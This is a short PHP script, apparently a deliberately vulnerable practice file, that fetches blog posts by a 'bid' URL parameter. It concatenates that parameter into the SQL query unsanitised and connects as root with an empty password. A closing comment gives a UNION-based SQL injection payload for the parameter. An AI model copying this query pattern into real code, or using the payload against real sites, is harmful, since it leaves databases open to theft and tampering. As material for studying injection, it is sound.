<?php
// Settting 
$dsn = 'mysql:host=localhost;dbname=meowtest;charset=utf8';
$username = 'root';
$password = '';

//Check & Connect to DBBBBBBBBBBBBBBBBBB
try {
      $db = new PDO($dsn, $username, $password);
      $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
      echo "Connected to the database successfully!";
}catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

//Query !!!!!!!!!!
try {
    $bid = isset($_GET['bid']) ? $_GET['bid'] : null;

    $sql = "SELECT * FROM blog WHERE bid =" .$bid;
    $statement = $db->prepare($sql);

    $statement->execute();
    $posts = $statement->fetchAll(PDO::FETCH_ASSOC);

    if ($posts) {
        foreach ($posts as $post) {
            echo '<h2>' . htmlspecialchars($post['title']) . '</h2>';
            echo '<p>' . htmlspecialchars($post['content']) . '</p>';
        }
    } else {
        echo 'No posts found.';
    }
} catch (PDOException $e) {

}
// Exploit bid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171786b71,0x7065724158775947494875744f6a6458475944476961446a5869656358616968765143625a645643,0x716a786271),NULL-- -
?>